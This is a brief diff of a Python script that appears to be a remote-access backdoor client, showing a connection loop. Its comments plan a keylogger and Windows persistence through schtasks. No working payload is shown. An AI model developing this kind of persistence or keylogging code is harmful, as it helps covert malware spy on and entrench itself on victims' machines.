@@ -26,7 +26,7 @@ def send(msg):
 def run(): #todo add keylogger?
     global conn_open, conn
 
-    #todo figure out persistance
+    #todo figure out persistance - schtasks can work but not w/ onlogin
 
     while True:
         if not conn:
